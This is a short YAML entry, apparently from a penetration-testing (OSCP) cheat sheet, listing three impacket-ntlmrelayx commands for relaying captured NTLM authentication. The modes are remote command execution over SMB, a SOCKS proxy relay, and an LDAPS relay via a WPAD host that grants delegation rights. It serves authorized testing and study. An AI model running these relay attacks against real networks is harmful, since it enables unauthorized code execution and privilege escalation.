---
variants:
  - label: exec
    command: |
      impacket-ntlmrelayx -smb2support -t smb://$IP -c 'whoami /all' -debug
  - label: socks
    command: |
      impacket-ntlmrelayx -smb2support -t smb://$IP -socks
  - label: wpad
    command: |
      impacket-ntlmrelayx -t ldaps://$DC.$DOMAIN -wh wpad --delegate-access
description: Relay captured NTLM authentication, by mode.
os: [Linux]
category: [oscp, cli]
service: [SMB, LDAP]
phase: [Exploitation]
references:
  - https://github.com/fortra/impacket
---
